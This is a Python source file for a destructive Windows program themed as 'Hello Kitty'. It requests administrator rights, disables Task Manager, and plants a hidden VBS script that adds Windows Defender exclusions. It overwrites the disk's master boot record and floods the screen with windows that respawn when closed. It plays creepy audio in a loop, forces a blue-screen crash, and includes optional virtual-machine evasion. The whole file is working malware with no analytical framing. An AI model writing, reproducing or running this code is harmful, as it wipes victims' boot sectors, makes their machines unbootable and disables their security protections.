###############################################################
####                  Made By DerKeks8141                  ####
###############################################################

import os
import sys
import platform
if os.name != "nt":
    sys.exit()
if platform.release() != '10':
    sys.exit()
from pathlib import Path
from tkinter import messagebox
import simpleaudio as sa
from threading import Thread
import numpy as np
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import psutil
import random
from random import randint
from time import sleep
from tkinter import *
import tkinter as tk
from win32gui import *
from win32ui import *
from win32con import *
from win32file import *
import win32comext.shell.shell as shell
ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0)

sample_rate = 44100
duration = 3
fade_in_time = 0.05
fade_out_time = 0.1
volume = 0.5
freq = 440

DontDownloadPath = str(Path.home()) + "\\AppData\\Local\\Temp\\djj012ndawm10d9wadaw.txt"
TempPath = str(Path.home()) + "\\AppData\\Local\\Temp"

def generate_tone(frequency, duration):
    t = np.linspace(0, duration, int(sample_rate * duration), False)
    tone = np.sin(frequency * t * 2 * np.pi)
    return tone

def generate_creepy_sound():
    base_freq = random.uniform(50, 200)
    overtones_freqs = np.linspace(base_freq, base_freq * 8, num=8, endpoint=False)

    tones = [generate_tone(f, duration) for f in overtones_freqs]

    sound = np.zeros_like(tones[0])
    for tone in tones:
        sound += tone

    num_speedups = random.randint(1, 3)
    speedup_indices = random.sample(range(0, len(sound)), num_speedups)

    for idx in speedup_indices:
        tone_idx = random.randint(0, len(tones)-1)
        tone = tones[tone_idx][idx:idx+int(sample_rate*0.1)]
        tone_speedup = np.interp(np.linspace(0, 1, len(tone)), [0, 0.5, 1], [1, 1.5, 2])
        tone = np.interp(np.linspace(0, 1, len(tone)), np.linspace(0, 1, len(tone_speedup)), tone_speedup)
        sound[idx:idx+int(sample_rate*0.1)] = tone

    fade_in = np.linspace(0, volume, int(fade_in_time * sample_rate), False)
    fade_out = np.linspace(volume, 0, int(fade_out_time * sample_rate), False)
    sound[:len(fade_in)] *= fade_in
    sound[-len(fade_out):] *= fade_out
    
    return sound

def Play_in_loop():
    while True:
        sound = generate_creepy_sound()
        play_obj = sa.play_buffer((sound * 32767).astype(np.int16), 1, 2, sample_rate)
        play_obj.wait_done()

def AntiVm():
  Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
  for process in psutil.process_iter():
      for i in Process:
        if i in process.name().lower():
            return CommitSuicide()

def CommitSuicide():
  sys.exit()

def Installation():
    if not os.path.isfile(DontDownloadPath):
        DTM()

        os.chdir(TempPath)

        text_file = open("val.vbs", "w")
        text_file.write(f'''
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'vbs'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.home())}\AppData\Local\Temp'", 0, True
        ''')       
        text_file.close()

        sleep(2)

        os.system("attrib +h " + 'val.vbs')

        os.system("start val.vbs")

        os.system("echo > djj012ndawm10d9wadaw.txt")

        DelMBR()

    elif os.path.isfile(DontDownloadPath):
        sys.exit()

def DelMBR():
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
    WriteFile(hDevice, AllocateReadBuffer(512), None)
    CloseHandle(hDevice)

    sleep(randint(5, 10))
    Window()

def DTM():
    try:
        os.system("start cmd /c REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    except:
        pass

def Window():
    window = Tk()
    window.geometry("1120x720")
    window.title("Hello Kitty")
    window.configure(background='pink')
    window.resizable(False, False)
    window.attributes('-toolwindow', True)
    window.wm_attributes("-topmost", 1)

    def on_closing():
        window_flush()

    HelloKittyLabel = Label(window, text="Please don't kill me", font=("Arial",30,"bold"), fg="white", bg="pink")
    HelloKittyLabel.pack()
    HelloKittyLabel.place(x=370,y=100)

    window.protocol("WM_DELETE_WINDOW", on_closing)
    window.mainloop()

def move_window(window, speed, dx, dy):
    x, y = map(int, window.geometry().split("+")[1:])
    w, h = window.winfo_width(), window.winfo_height()
    if x + w >= 1920:
        dx = -1 * abs(dx)
    elif x <= 0:
        dx = abs(dx)
    if y + h >= 1080:
        dy = -1 * abs(dy)
    elif y <= 0:
        dy = abs(dy)
    window.geometry("{}x{}+{}+{}".format(w, h, x+dx*speed, y+dy*speed))
    window.after(20, move_window, window, speed, dx, dy)

def create_new_windows(window):
    for i in range(3):
        new_window = tk.Toplevel(window)
        new_window.geometry(window.geometry())
        speed = random.randint(15, 20)
        dx = random.choice([-1, 1])
        dy = random.choice([-1, 1])
        new_window.title("Hello Kitty")
        new_window.protocol("WM_DELETE_WINDOW", lambda: create_new_windows(window))
        new_window.configure(background='pink')
        new_window.resizable(False, False)
        new_window.attributes('-toolwindow', True)
        new_window.wm_attributes("-topmost", 1)
        new_window.after(20, move_window, new_window, speed, dx, dy)

def window_flush():
    root = tk.Tk()
    root.withdraw()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    for i in range(4):
        x_pos = random.randint(0, screen_width-250)
        y_pos = random.randint(0, screen_height-150)
        new_window = tk.Toplevel()
        new_window.geometry("250x150+{}+{}".format(x_pos, y_pos))
        speed = random.randint(15, 20)
        dx = random.choice([-1, 1])
        dy = random.choice([-1, 1])
        new_window.title("Hello Kitty")
        new_window.protocol("WM_DELETE_WINDOW", lambda: create_new_windows(new_window))
        new_window.configure(background='pink')
        new_window.resizable(False, False)
        new_window.attributes('-toolwindow', True)
        new_window.wm_attributes("-topmost", 1)
        new_window.after(20, move_window, new_window, speed, dx, dy)
    
    tk.mainloop()
    
def BSOD():
    sleep(randint(30, 60))

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19), 
        c_uint(1), 
        c_uint(0), 
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B), 
        c_ulong(0), 
        nullptr, 
        nullptr, 
        c_uint(6), 
        byref(c_uint())
    )
    
if __name__ == "__main__":
    #AntiVm() Optional
    Thread(target = Installation).start()
    Thread(target = Play_in_loop).start()
    Thread(target = BSOD).start()
